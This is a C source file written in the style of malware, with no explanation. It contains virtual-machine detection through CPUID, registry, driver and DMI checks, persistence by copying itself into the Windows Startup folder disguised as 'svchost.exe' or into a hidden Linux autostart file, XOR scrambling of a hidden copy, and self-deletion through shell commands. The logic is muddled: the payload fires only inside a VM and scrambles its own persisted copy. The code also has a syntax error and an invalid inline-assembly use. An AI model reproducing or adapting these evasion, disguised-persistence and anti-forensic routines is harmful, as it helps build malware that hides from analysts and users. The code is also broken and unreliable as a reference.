#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <tchar.h>
#include <tlhelp32.h>
#else
#include <unistd.h>
#include <dirent.h>
#endif

int detect_vm() {
    int detected = 0;
    
    #ifdef _WIN32
    __asm {
        mov eax, 1
        cpuid
        bt ecx, 31
        setc detected
    }

    if (detected) return 1;

    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buf[256];
        DWORD sz = sizeof(buf);
        if (RegQueryValueEx(hKey, "SystemProductName", NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
            if (strstr(buf, "Virtual") || strstr(buf, "VMware") || strstr(buf, "VirtualBox") || strstr(buf, "QEMU")) {
                RegCloseKey(hKey);
                return 1;
            }
        }
        RegCloseKey(hKey);
    }

    if (GetModuleHandle("vmmouse.sys") || GetModuleHandle("VBoxMouse.sys")) return 1;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }

    #else
    FILE *fp;
    char buf[128];

    fp = popen("cat /sys/class/dmi/id/product_name 2>/dev/null", "r");
    if (fp) {
        while (fgets(buf, sizeof(buf), fp)) {
            if (strstr(buf, "VirtualBox") || strstr(buf, "VMware") || strstr(buf, "QEMU") || strstr(buf, "KVM")) {
                pclose(fp);
                return 1;
            }
        }
        pclose(fp);
    }

    fp = popen("grep -c hypervisor /proc/cpuinfo 2>/dev/null", "r");
    if (fp) {
        if (fgets(buf, sizeof(buf), fp) {
            if (atoi(buf) > 0) {
                pclose(fp);
                return 1;
            }
        }
        pclose(fp);
    }
    #endif

    return 0;
}

void encrypt_data(unsigned char *data, size_t len) {
    const unsigned char key = 0x55;
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void copy_file(const char *src, const char *dst) {
    #ifdef _WIN32
    CopyFile(src, dst, FALSE);
    #else
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\" 2>/dev/null", src, dst);
    system(cmd);
    #endif
}

void persist() {
    #ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    char newpath[MAX_PATH];
    snprintf(newpath, sizeof(newpath), "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe", getenv("USERPROFILE"));
    copy_file(path, newpath);
    #else
    char path[1024];
    readlink("/proc/self/exe", path, sizeof(path));
    char newpath[1024];
    snprintf(newpath, sizeof(newpath), "%s/.config/autostart/.systemd", getenv("HOME"));
    copy_file(path, newpath);
    #endif
}

void self_remove() {
    #ifdef _WIN32
    char cmd[MAX_PATH + 10];
    snprintf(cmd, sizeof(cmd), "ping 127.0.0.1 -n 2 > nul & del \"%s\"", __argv[0]);
    system(cmd);
    #else
    system("sleep 1; rm -f \"$0\"");
    #endif
}

int main() {
    srand(time(NULL));
    
    if (detect_vm()) {
        char src[1024];
        #ifdef _WIN32
        GetModuleFileName(NULL, src, sizeof(src));
        #else
        readlink("/proc/self/exe", src, sizeof(src));
        #endif

        char dst[1024];
        #ifdef _WIN32
        snprintf(dst, sizeof(dst), "%s\\Documents\\winhelper.exe", getenv("USERPROFILE"));
        #else
        snprintf(dst, sizeof(dst), "%s/.cache/.syshelper", getenv("HOME"));
        #endif

        copy_file(src, dst);
        persist();
        
        FILE *fp = fopen(dst, "rb+");
        if (fp) {
            fseek(fp, 0, SEEK_END);
            long len = ftell(fp);
            fseek(fp, 0, SEEK_SET);
            unsigned char *data = malloc(len);
            fread(data, 1, len, fp);
            encrypt_data(data, len);
            fseek(fp, 0, SEEK_SET);
            fwrite(data, 1, len, fp);
            fclose(fp);
            free(data);
        }
        
        self_remove();
    }
    
    return 0;
}
